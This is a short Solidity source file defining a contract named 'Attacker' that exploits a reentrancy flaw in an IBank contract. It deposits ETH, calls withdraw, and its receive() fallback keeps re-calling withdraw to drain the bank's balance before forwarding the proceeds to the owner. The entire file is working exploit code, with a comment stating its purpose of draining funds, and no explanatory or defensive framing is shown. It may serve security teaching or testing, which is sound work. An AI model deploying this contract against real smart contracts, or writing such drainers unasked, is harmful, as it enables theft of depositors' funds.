// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBank {
    function deposit() external payable;
    function withdraw() external payable;
}

contract Attacker {

    IBank private _bank;
    address private _owner;
    uint private _amount;

    constructor(address bank) {
        _bank = IBank(bank);
        _owner = msg.sender;
    }


    function stealFunds() external payable {
        _amount = msg.value;
        _bank.deposit{value: msg.value}();
        _bank.withdraw();
    }

    receive() external payable {
        // keep draining funds as long as they're available
        if (address(_bank).balance >= _amount) {
            _bank.withdraw();
        } else {
            payable(_owner).call{value: address(this).balance}("");
        }
    }

}
